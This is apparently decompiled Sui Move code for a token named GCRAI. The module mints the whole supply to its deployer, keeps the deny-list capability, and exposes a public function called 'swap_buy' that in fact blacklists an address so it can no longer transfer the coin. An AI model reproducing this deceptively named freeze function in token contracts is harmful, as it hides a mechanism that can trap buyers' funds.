module 0x6c5019309820560bc9534028fac7ac844c96c36286405fc02d05b1e1dd0a83f6::gcrai {
    struct GCRAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GCRAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GCRAI>(arg0, 9, b"GCRAI", b"GCR ai", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmV7ievq8NPLwh9w8gtX6EVzSpuVP7z6A9AyHkd27hMTxL"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GCRAI>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GCRAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GCRAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GCRAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GCRAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GCRAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

